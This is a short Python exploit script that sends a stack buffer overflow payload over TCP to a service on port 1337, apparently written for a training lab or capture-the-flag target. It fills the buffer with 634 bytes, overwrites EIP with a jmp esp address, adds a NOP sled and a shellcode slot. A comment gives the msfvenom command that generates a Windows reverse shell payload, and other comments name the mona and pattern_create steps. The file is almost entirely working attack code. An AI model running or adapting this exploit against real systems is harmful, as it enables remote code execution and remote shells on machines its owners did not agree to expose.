#!/usr/bin/env python3
import socket

ip = ""
port = 1337
timeout = 5

prefix = ""

def send(buffer):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(bytes(buffer, "latin-1"))
        s.close()

if __name__ == '__main__':
    shellcode = ( # msfvenom -p windows/shell_reverse_tcp LHOST=$(iptun) EXITFUNC=thread LPORT=4444 -f c -b "\x00\x23\x3c\x83\xba"
        
    )
    overflow = "A" * 634 # /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LEN
    eip = "\xaf\x11\x50\x62" #0x625011AF - jmp esp --> !mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
    nops = "\x90" * 16
    payload = prefix + overflow + eip + nops + shellcode
    try:
        send(payload)
    except Exception as ex:
        print(f"Error:\n{ex}")